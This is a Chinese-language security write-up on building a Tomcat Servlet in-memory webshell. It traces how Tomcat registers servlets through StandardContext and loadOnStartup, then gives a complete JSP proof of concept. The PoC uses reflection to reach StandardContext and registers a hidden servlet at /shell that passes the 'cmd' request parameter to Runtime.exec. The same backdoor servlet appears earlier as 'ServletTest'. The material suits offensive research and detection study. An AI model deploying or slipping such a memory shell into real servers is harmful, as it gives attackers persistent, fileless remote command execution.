# Servlet创建
  我们先来看看servlet接口有什么方法
```java
public interface Servlet {
	// 由servlet容器调用，向servlet表明该servlet正在被投入服务。
	// 在实例化servlet之后，servlet容器正好调用init方法一次。在servlet可以接收任何请求之前，init方法必须成功完成。
	// 如果init方法出现以下情况，servlet容器就不能将servlet放入服务中
	// 抛出一个ServletException
	// 在Web服务器定义的时间段内没有返回
	public void init(ServletConfig config) throws ServletException;

	// 返回一个ServletConfig对象，其中包含该Servlet的初始化和启动参数。返回的ServletConfig对象是传递给init方法的对象。
	// 这个接口的实现负责存储ServletConfig对象，以便这个方法能够返回它。实现这个接口的GenericServlet类已经做到了这一点。
	public ServletConfig getServletConfig();  

	// 由servlet容器调用，允许servlet对请求作出响应。
	// 这个方法只有在servlet的init()方法成功完成后才会被调用。
	// 对于抛出或发送错误的servlet，响应的状态代码总是应该被设置。
	// Servlet通常在多线程的Servlet容器内运行，可以同时处理多个请求。开发人员必须注意同步访问任何共享资源，如文件、网络连接和以及servlet的类和实例变量。关于Java中多线程编程的更多信息，可以在Java多线程编程教程中找到。
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException;

	// 返回有关Servlet的信息，如作者、版本和版权。
	// 该方法返回的字符串应该是纯文本，而不是任何形式的标记（如HTML、XML等）。
    public String getServletInfo();

    // 由servlet容器调用，向servlet表明该servlet将被退出服务。只有在servlet的服务方法中的所有线程都退出后，或者在超时期过后，才会调用这个方法。在servlet容器调用该方法后，它将不再调用该servlet的服务方法。
    // 这个方法给了servlet一个机会来清理任何被保留的资源（例如，内存、文件句柄、线程），并确保任何持久化状态与servlet在内存中的当前状态同步。
    public void destroy();
}
```
`service()`应该就是我们要写的那个执行的逻辑，我们的恶意代码应该就是放在这里的。

```java
package tomcatShell.Servlet;  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import java.io.IOException;  
  
// 基础恶意类   
public class ServletTest implements Servlet {  
    @Override  
 public void init(ServletConfig config) throws ServletException {  
  
    }  
  
    @Override  
 public ServletConfig getServletConfig() {  
        return null;  
 }  
  
    @Override  
 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {  
        String cmd = req.getParameter("cmd");  
 if (cmd !=null){  
            try{  
                Runtime.getRuntime().exec(cmd);  
 }catch (IOException e){  
                e.printStackTrace();  
 }catch (NullPointerException n){  
                n.printStackTrace();  
 }  
        }  
    }  
  
    @Override  
 public String getServletInfo() {  
        return null;  
 }  
  
    @Override  
 public void destroy() {  
  
    }  
}
```
配置web.xml看一眼，可以执行命令，没问题。
现在依旧还是那个问题，Servlet是怎么注册的？

Servlet的生命周期分为五部分
1. 加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建 `Servlet` 的实例
2. 初始化：当Servlet被实例化的时候，Tomcat会调用 `init()`方法初始化这个对象
3. 处理服务：当浏览器访问Servlet的时候，Servlet 会调用`service()`方法处理请求
4. 销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用`destroy()`方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁
5. 卸载：当Servlet调用完`destroy()`方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用`init()`方法进行初始化操作

我个人思路是，不管怎么样，核心一定在 `StanderContext`中，我们类比Filter 和Listener，去核心中找找方法。
可以看到，这里重写了三个 `addServlet`
![](picture/Pasted%20image%2020260109115516.png)
发现这里不是核心逻辑，我们找接口的实现方法

发现三个 `addServlet`最后都走向了一个私有的 `addServivce` 方法
![](picture/Pasted%20image%2020260110154510.png)
```java
 private ServletRegistration.Dynamic addServlet(String servletName, String servletClass,  
        Servlet servlet, Map<String,String> initParams) throws IllegalStateException {  
  
    if (servletName == null || servletName.equals("")) {  
        throw new IllegalArgumentException(sm.getString(  
                "applicationContext.invalidServletName", servletName));  
    }  
  
    if (!context.getState().equals(LifecycleState.STARTING_PREP)) {  
        //TODO Spec breaking enhancement to ignore this restriction  
        throw new IllegalStateException(  
                sm.getString("applicationContext.addServlet.ise",  
                        getContextPath()));  
    }  
  
    Wrapper wrapper = (Wrapper) context.findChild(servletName);  
  
    // Assume a 'complete' ServletRegistration is one that has a class and  
    // a name    if (wrapper == null) {  
        wrapper = context.createWrapper();  
        wrapper.setName(servletName);  
        context.addChild(wrapper);  
    } else {  
        if (wrapper.getName() != null &&  
                wrapper.getServletClass() != null) {  
            if (wrapper.isOverridable()) {  
                wrapper.setOverridable(false);  
            } else {  
                return null;  
            }  
        }  
    }  
  
    ServletSecurity annotation = null;  
    if (servlet == null) {  
        wrapper.setServletClass(servletClass);  
        Class<?> clazz = Introspection.loadClass(context, servletClass);  
        if (clazz != null) {  
            annotation = clazz.getAnnotation(ServletSecurity.class);  
        }  
    } else {  
        wrapper.setServletClass(servlet.getClass().getName());  
        wrapper.setServlet(servlet);  
        if (context.wasCreatedDynamicServlet(servlet)) {  
            annotation = servlet.getClass().getAnnotation(ServletSecurity.class);  
        }  
    }  
  
    if (initParams != null) {  
        for (Map.Entry<String, String> initParam: initParams.entrySet()) {  
            wrapper.addInitParameter(initParam.getKey(), initParam.getValue());  
        }  
    }  
  
    ServletRegistration.Dynamic registration =  
            new ApplicationServletRegistration(wrapper, context);  
    if (annotation != null) {  
        registration.setServletSecurity(new ServletSecurityElement(annotation));  
    }  
    return registration;  
}
```
显而易见，这是核心的实现
可以看到开头，先对传入的`servletName`进行检测，为空时会抛出异常。接着判断`context`的生命周期，如果处于`LifecycleState.STARTING_PREP`状态，同样会抛出异常。
```java
if (servletName == null || servletName.equals("")) {  
    throw new IllegalArgumentException(sm.getString(  
            "applicationContext.invalidServletName", servletName));  
}  
  
if (!context.getState().equals(LifecycleState.STARTING_PREP)) {  
    //TODO Spec breaking enhancement to ignore this restriction  
    throw new IllegalStateException(  
            sm.getString("applicationContext.addServlet.ise",  
                    getContextPath()));  
}
```
接着通过`servletName`从`context`中寻找相关联的子容器，并将其转换成`Wrapper`对象，当不存在时，会创建一个名字为`servletName`的`wrapper`，再将创建的`wrapper`添加到`context`的子容器中。最后判断`servlet`是否为`null`，当`servlet == null`时，会将传入的`servletClass`设置进`wrapper`中。最后调用

`org.apache.catalina.core.StandardContext#dynamicServletAdded`方法进行`servlet`动态加载。
![](picture/Pasted%20image%2020260110155438.png)
在`StandardContext`#`startInternal`中，调用了`fireLifecycleEvent()`方法解析web.xml文件，我们跟进
```java
protected void fireLifecycleEvent(String type, Object data) {
        LifecycleEvent event = new LifecycleEvent(this, type, data);
        for (LifecycleListener listener : lifecycleListeners) {
            listener.lifecycleEvent(event);
        }
    }
```
最终通过`ContextConfig#webConfig()`方法解析web.xml获取各种配置参数
![](picture/Pasted%20image%2020260111221515.png)
然后通过`configureContext(webXml)`方法创建StandWrapper对象，**并根据解析参数初始化StandWrapper对象**
```java
 private void configureContext(WebXml webxml) {
        // As far as possible, process in alphabetical order so it is easy to
        // check everything is present
        // Some validation depends on correct public ID
        context.setPublicId(webxml.getPublicId());
 
...   //设置StandardContext参数
 
        
        for (ServletDef servlet : webxml.getServlets().values()) {
 
            //创建StandardWrapper对象
            Wrapper wrapper = context.createWrapper();
 
            if (servlet.getLoadOnStartup() != null) {
 
                //设置LoadOnStartup属性
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
 
            //设置ServletName属性
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
 
            //设置ServletClass属性
            wrapper.setServletClass(servlet.getServletClass());
            ...
            wrapper.setOverridable(servlet.isOverridable());
 
            //将包装好的StandWrapper添加进ContainerBase的children属性中
            context.addChild(wrapper);
 
           for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
          
            //添加路径映射
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        }
        ...
    }
```
最后通过`addServletMappingDecoded()`方法添加Servlet对应的url映射

接着在`StandardContext#startInternal`方法通过`findChildren()`获取`StandardWrapper`类
最后依次加载完Listener、Filter后，就通过`loadOnStartUp()`方法加载wrapper
```java
    public boolean loadOnStartup(Container children[]) {
 
        // Collect "load on startup" servlets that need to be initialized
        TreeMap<Integer, ArrayList<Wrapper>> map = new TreeMap<>();
        for (Container child : children) {
            Wrapper wrapper = (Wrapper) child;
            int loadOnStartup = wrapper.getLoadOnStartup();
 
            //判断属性loadOnStartup的值
            if (loadOnStartup < 0) {
                continue;
            }
            Integer key = Integer.valueOf(loadOnStartup);
            ArrayList<Wrapper> list = map.get(key);
            if (list == null) {
                list = new ArrayList<>();
                map.put(key, list);
            }
            list.add(wrapper);
        }
 
        // Load the collected "load on startup" servlets
        for (ArrayList<Wrapper> list : map.values()) {
            for (Wrapper wrapper : list) {
                try {
                    wrapper.load();
                }
```
注意这里对于Wrapper对象中`loadOnStartup`属性的值进行判断，只有大于0的才会被放入list进行后续的`wrapper.load()`加载调用。

这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过`loadOnStartup`属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。

至此Servlet才被加载到内存中。

# 实现

动态注入`Servlet`内存马的具体思路如下:

1. 调用`StandardContext.createWrapper`为`servlet`创建`wrapper`；
2. 设置`StandardWrapper`对象的`LoadOnStartup`启动优先级；
3. 设置`StandardWrapper`对象的`ServletName`；
4. 设置`StandardWrapper`对象的`ServletClass`；
5. `addChild`添加`wrapper`到`Context`；
6. `addServletMapping`添加映射。

还是和之前一样，拿到StandardContext

然后创建Wapper对象
```jsp
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
```
将Wrapper添加进StandardContext
```jsp
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```
完整Poc
```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>
 
<%!
 
    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
 
%>
 
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
 
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```
这里我们得访问对应注册的路径，进行命令执行
这里注册路由是/shell




























